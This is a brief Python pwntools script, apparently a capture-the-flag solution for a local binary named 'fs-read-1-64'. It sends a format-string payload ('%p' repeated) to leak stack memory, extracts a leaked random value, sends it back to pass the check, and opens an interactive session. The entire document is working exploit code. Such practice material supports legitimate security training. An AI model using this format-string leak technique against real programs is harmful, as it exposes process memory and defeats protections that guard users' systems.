from pwn import *

# Launch processs
p = process('./fs-read-1-64')

# Read rand
print(p.recvline())
p.sendline('%p%p%p%p%p%p%p')

# Parse rand
data = p.recvline()
data = data[len(data)-17:len(data)-9]
print(data)

# Send rand
p.sendline(data)
p.interactive()
